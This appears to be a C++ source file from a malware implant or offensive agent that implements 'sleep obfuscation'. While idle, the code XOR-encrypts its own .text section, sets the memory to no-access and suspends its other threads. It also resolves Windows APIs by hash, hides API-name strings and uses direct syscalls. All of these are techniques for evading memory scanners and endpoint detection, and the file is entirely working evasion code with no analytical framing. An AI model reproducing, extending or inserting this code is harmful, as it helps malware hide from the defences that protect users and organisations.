#include "SleepObf.h"
#include "Syscalls.h"
#include "Resolver.h"
#include "Internal.h"
#include "Obfuscation.h"
#include "../../DebugLog.h"
#include <windows.h>
#include <intrin.h>
#include <vector>
// Section name is randomized per-build via build.bat SLEEPSEC_NAME define
#ifndef SLEEPSEC_NAME
#define SLEEPSEC_NAME ".rsrc2"
#endif
#pragma comment(linker, "/SECTION:" SLEEPSEC_NAME ",ER")
#pragma code_seg(SLEEPSEC_NAME)
namespace SleepObf {
    typedef HANDLE(WINAPI* CreateEventW_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
    typedef BOOL(WINAPI* SetEvent_t)(HANDLE);
    typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
    typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
    typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    static CreateEventW_t             g_CreateEventW = nullptr;
    static SetEvent_t                 g_SetEvent = nullptr;
    static WaitForSingleObject_t      g_WaitForSingleObject = nullptr;
    static CreateThread_t             g_CreateThread = nullptr;
    static CloseHandle_t              g_CloseHandle = nullptr;
    static NtProtectVirtualMemory_t   g_pNtProtect = nullptr;
    static bool                       g_initialized = false;
    struct DecryptCtx {
        PVOID  textBase;
        SIZE_T textSize;
        UCHAR  key[16];
        HANDLE hEvent;           
        NtProtectVirtualMemory_t pNtProtect;
        SetEvent_t               pSetEvent;
        WaitForSingleObject_t    pWFSO;
        CreateEventW_t           pCreateEventW;
        CloseHandle_t            pCloseHandle;
        DWORD  sleepMs;
        volatile LONG decrypted; 
    };
    static void XorBlock(PVOID base, SIZE_T size, const UCHAR* key, SIZE_T keyLen) {
        UCHAR* p = (UCHAR*)base;
        SIZE_T i = 0;
        if (keyLen == 16) {
            for (; i + 15 < size; i += 16) {
                for (SIZE_T j = 0; j < 16; j++)
                    p[i + j] ^= key[j];
            }
        }
        for (; i < size; i++)
            p[i] ^= key[i % keyLen];
    }
    static bool GetTextSection(PVOID* pBase, SIZE_T* pSize) {
        HMODULE hSelf = Internal::_GetModuleHandleA(NULL);
        if (!hSelf) return false;
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hSelf;
        PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hSelf + pDos->e_lfanew);
        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
        for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
            if (pSec[i].Name[0] == '.' && pSec[i].Name[1] == 't' &&
                pSec[i].Name[2] == 'e' && pSec[i].Name[3] == 'x' &&
                pSec[i].Name[4] == 't') {
                *pBase = (PVOID)((BYTE*)hSelf + pSec[i].VirtualAddress);
                *pSize = pSec[i].Misc.VirtualSize;
                return true;
            }
        }
        return false;
    }
    static std::vector<DWORD> SuspendOtherThreads() {
        std::vector<DWORD> suspended;
        DWORD currentPid = Internal::_GetCurrentProcessId();
        DWORD currentTid = Internal::_GetCurrentThreadId();
        auto _Snap    = (Resolver::CreateToolhelp32Snapshot_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_CREATETOOLHELP32SNAPSHOT);
        auto _First   = (Resolver::Thread32First_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_THREAD32FIRST);
        auto _Next    = (Resolver::Thread32Next_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_THREAD32NEXT);
        auto _Open    = (Resolver::OpenThread_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_OPENTHREAD);
        auto _Suspend = (Resolver::SuspendThread_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_SUSPENDTHREAD);
        auto _Close   = (Resolver::CloseHandle_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_CLOSEHANDLE);
        if (!_Snap || !_First || !_Next || !_Open || !_Suspend || !_Close)
            return suspended;
        HANDLE hSnap = _Snap(TH32CS_SNAPTHREAD, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return suspended;
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        if (_First(hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == currentPid && te.th32ThreadID != currentTid) {
                    HANDLE hT = _Open(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                    if (hT) { _Suspend(hT); suspended.push_back(te.th32ThreadID); _Close(hT); }
                }
            } while (_Next(hSnap, &te));
        }
        _Close(hSnap);
        return suspended;
    }
    static void ResumeOtherThreads(const std::vector<DWORD>& tids) {
        auto _Open   = (Resolver::OpenThread_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_OPENTHREAD);
        auto _Resume = (Resolver::ResumeThread_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_RESUMETHREAD);
        auto _Close  = (Resolver::CloseHandle_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_CLOSEHANDLE);
        if (!_Open || !_Resume || !_Close) return;
        for (DWORD tid : tids) {
            HANDLE hT = _Open(THREAD_SUSPEND_RESUME, FALSE, tid);
            if (hT) { _Resume(hT); _Close(hT); }
        }
    }
    static DWORD WINAPI DecryptThreadProc(LPVOID lpParam) {
        auto* ctx = (DecryptCtx*)lpParam;
        HANDLE hDummy = ctx->pCreateEventW(NULL, TRUE, FALSE, NULL);
        if (hDummy) {
            ctx->pWFSO(hDummy, ctx->sleepMs);
            ctx->pCloseHandle(hDummy);
        }
        PVOID  base = ctx->textBase;
        SIZE_T size = ctx->textSize;
        ULONG  old  = 0;
        ctx->pNtProtect((HANDLE)-1, &base, &size, PAGE_READWRITE, &old);
        XorBlock(ctx->textBase, ctx->textSize, ctx->key, 16);
        base = ctx->textBase; size = ctx->textSize;
        ctx->pNtProtect((HANDLE)-1, &base, &size, PAGE_EXECUTE_READ, &old);
        InterlockedExchange(&ctx->decrypted, 1);
        ctx->pSetEvent(ctx->hEvent);
        return 0;
    }
    bool Init() {
        if (g_initialized) return true;
        if (!Internal::_GetProcAddress || !Internal::_GetModuleHandleA) {
            SLOG("[SLEEPOBF] Init FAILED: GPA or GMH null");
            return false;
        }
        auto k32 = OBFS_S("kernel32.dll");
        HMODULE hK32 = Internal::_GetModuleHandleA(k32.c_str());
        if (!hK32) { SLOG("[SLEEPOBF] Init FAILED: kernel32 not found"); return false; }
        // Fix dangling pointer: capture OBFS_S results before calling .c_str()
        auto ceStr   = OBFS_S("CreateEventW");
        auto seStr   = OBFS_S("SetEvent");
        auto wfsoStr = OBFS_S("WaitForSingleObject");
        auto ctStr   = OBFS_S("CreateThread");
        auto chStr   = OBFS_S("CloseHandle");
        g_CreateEventW        = (CreateEventW_t)Internal::_GetProcAddress(hK32, ceStr.c_str());
        g_SetEvent            = (SetEvent_t)Internal::_GetProcAddress(hK32, seStr.c_str());
        g_WaitForSingleObject = (WaitForSingleObject_t)Internal::_GetProcAddress(hK32, wfsoStr.c_str());
        g_CreateThread        = (CreateThread_t)Internal::_GetProcAddress(hK32, ctStr.c_str());
        g_CloseHandle         = (CloseHandle_t)Internal::_GetProcAddress(hK32, chStr.c_str());
        SLOG("[SLEEPOBF] APIs: CE=%p SE=%p WFSO=%p CT=%p CH=%p",
             g_CreateEventW, g_SetEvent, g_WaitForSingleObject,
             g_CreateThread, g_CloseHandle);
        auto ntStr = OBFS_S("ntdll.dll");
        HMODULE hNt = Internal::_GetModuleHandleA(ntStr.c_str());
        if (hNt) {
            auto npStr = OBFS_S("NtProtectVirtualMemory");
            g_pNtProtect = (NtProtectVirtualMemory_t)Internal::_GetProcAddress(hNt, npStr.c_str());
        }
        SLOG("[SLEEPOBF] NtProtect=%p", g_pNtProtect);
        g_initialized = (g_CreateEventW && g_SetEvent && g_WaitForSingleObject &&
                         g_CreateThread && g_CloseHandle && g_pNtProtect);
        SLOG("[SLEEPOBF] Init result: %s", g_initialized ? "OK" : "FAILED");
        return g_initialized;
    }
    void ObfuscatedSleep(DWORD milliseconds) {
        if (milliseconds < 500 || !g_initialized) {
            SLOG("[SLEEPOBF] Short/fallback sleep %dms (init=%d)", milliseconds, g_initialized);
            LONGLONG delay = -(LONGLONG)milliseconds * 10000LL;
            Syscalls::NtDelayExecution(FALSE, &delay);
            return;
        }
        SLOG("[SLEEPOBF] ObfuscatedSleep(%dms) starting", milliseconds);
        PVOID textBase = NULL;
        SIZE_T textSize = 0;
        if (!GetTextSection(&textBase, &textSize) || textSize == 0) {
            SLOG("[SLEEPOBF] GetTextSection FAILED, fallback sleep");
            LONGLONG delay = -(LONGLONG)milliseconds * 10000LL;
            Syscalls::NtDelayExecution(FALSE, &delay);
            return;
        }
        SLOG("[SLEEPOBF] .text base=%p size=%zu", textBase, textSize);
        HANDLE hEvent = g_CreateEventW(NULL, FALSE, FALSE, NULL);
        if (!hEvent) {
            LONGLONG delay = -(LONGLONG)milliseconds * 10000LL;
            Syscalls::NtDelayExecution(FALSE, &delay);
            return;
        }
        UCHAR key[16];
        unsigned __int64 tsc1 = __rdtsc();
        unsigned __int64 tsc2 = __rdtsc();
        for (int i = 0; i < 8; i++) key[i]     = (UCHAR)(tsc1 >> (i * 8));
        for (int i = 0; i < 8; i++) key[8 + i]  = (UCHAR)(tsc2 >> (i * 8));
        ULONG_PTR stackAddr = (ULONG_PTR)&key;
        key[0] ^= (UCHAR)(stackAddr);
        key[7] ^= (UCHAR)(stackAddr >> 8);
        SLOG("[SLEEPOBF] Suspending other threads...");
        auto suspendedTids = SuspendOtherThreads();
        SLOG("[SLEEPOBF] Suspended %zu threads", suspendedTids.size());
        DecryptCtx dctx = {};
        dctx.textBase     = textBase;
        dctx.textSize     = textSize;
        memcpy(dctx.key, key, 16);
        dctx.hEvent       = hEvent;
        dctx.pNtProtect   = g_pNtProtect;
        dctx.pSetEvent    = g_SetEvent;
        dctx.pWFSO        = g_WaitForSingleObject;
        dctx.pCreateEventW = g_CreateEventW;
        dctx.pCloseHandle = g_CloseHandle;
        dctx.sleepMs      = milliseconds;
        dctx.decrypted    = 0;
        SLOG("[SLEEPOBF] Setup done, encrypting .text and sleeping %dms...", milliseconds);
        {
            PVOID  encBase = textBase;
            SIZE_T encSize = textSize;
            ULONG  encOld  = 0;
            g_pNtProtect((HANDLE)-1, &encBase, &encSize, PAGE_READWRITE, &encOld);
            XorBlock(textBase, textSize, key, 16);
            encBase = textBase; encSize = textSize;
            g_pNtProtect((HANDLE)-1, &encBase, &encSize, PAGE_NOACCESS, &encOld);
        }
        HANDLE hThread = g_CreateThread(NULL, 0, DecryptThreadProc, &dctx, 0, NULL);
        if (hThread) {
            g_WaitForSingleObject(hEvent, milliseconds + 5000);
        }
        if (InterlockedCompareExchange(&dctx.decrypted, 0, 0) == 0) {
            PVOID b = textBase; SIZE_T s = textSize; ULONG o = 0;
            g_pNtProtect((HANDLE)-1, &b, &s, PAGE_READWRITE, &o);
            XorBlock(textBase, textSize, key, 16);
            b = textBase; s = textSize;
            g_pNtProtect((HANDLE)-1, &b, &s, PAGE_EXECUTE_READ, &o);
        }
        SLOG("[SLEEPOBF] Wait returned, decrypted=%d", (int)dctx.decrypted);
        if (hThread) {
            g_WaitForSingleObject(hThread, 1000); 
            g_CloseHandle(hThread);
        }
        Internal::_CloseHandle(hEvent);
        volatile UCHAR* vk = (volatile UCHAR*)key;
        for (int i = 0; i < 16; i++) vk[i] = 0;
        volatile UCHAR* vc = (volatile UCHAR*)dctx.key;
        for (int i = 0; i < 16; i++) { vc[i] = 0; }
        SLOG("[SLEEPOBF] Resuming %zu threads...", suspendedTids.size());
        ResumeOtherThreads(suspendedTids);
        SLOG("[SLEEPOBF] ObfuscatedSleep completed OK");
    }
}
#pragma code_seg() 
